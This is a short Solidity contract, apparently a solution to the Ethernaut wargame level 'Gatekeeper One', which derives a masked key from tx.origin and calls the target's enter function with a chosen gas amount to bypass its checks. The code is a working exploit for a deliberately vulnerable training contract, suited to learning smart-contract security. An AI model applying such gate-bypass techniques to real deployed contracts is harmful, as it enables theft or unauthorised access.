// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 13: Gatekeeper One
// https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A

contract GatekeeperOne_Hack {
  
  address gatekeeperOneInstance;
  bytes8 _gateKey;

  constructor(address _gatekeeperOneInstance) {
      gatekeeperOneInstance = _gatekeeperOneInstance;
  }
  
  function setGateKey() public {
    _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
  }

  function registerAsEntrant(uint gasToUse) public {
    address(gatekeeperOneInstance).call{gas: gasToUse}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
  }
}
